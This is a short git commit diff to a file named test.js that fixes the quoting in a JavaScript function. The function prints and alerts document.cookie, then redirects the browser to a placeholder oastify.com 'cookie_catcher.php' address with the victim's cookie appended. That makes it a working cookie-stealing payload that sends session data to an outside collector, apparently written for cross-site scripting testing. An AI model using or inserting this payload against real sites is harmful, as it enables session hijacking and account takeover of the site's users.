07427633ef6017304eb121ef69cad42a3ccd0ebb
joshualingat <73262114+joshualingat@users.noreply.github.com>
2023-06-27 16:40:48 +0800

    Update test.js

--- test.js
+++ test.js
@@ -2,4 +2,4 @@
 
 module.exports = function() {document.write (document.cookie);
 alert (document.cookie);
-document.location= https://YOUR_URL_HERE.oastify.com/cookie_catcher.php?c= + document.cookie;}
+document.location= 'https://YOUR_URL_HERE.oastify.com/cookie_catcher.php?c=' + document.cookie;}
